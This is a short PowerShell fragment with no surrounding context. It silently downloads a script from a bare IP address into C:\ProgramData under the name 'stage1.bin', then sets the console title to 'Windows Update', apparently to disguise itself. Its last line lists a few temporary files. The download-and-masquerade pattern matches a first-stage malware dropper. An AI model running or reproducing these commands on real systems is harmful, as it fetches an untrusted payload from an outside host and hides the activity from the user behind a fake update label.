curl.exe -s -L -o 'C:\ProgramData\stage1.bin' "http://192.0.2.33/updater.ps1"
$Host.UI.RawUI.WindowTitle = "Windows Update"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
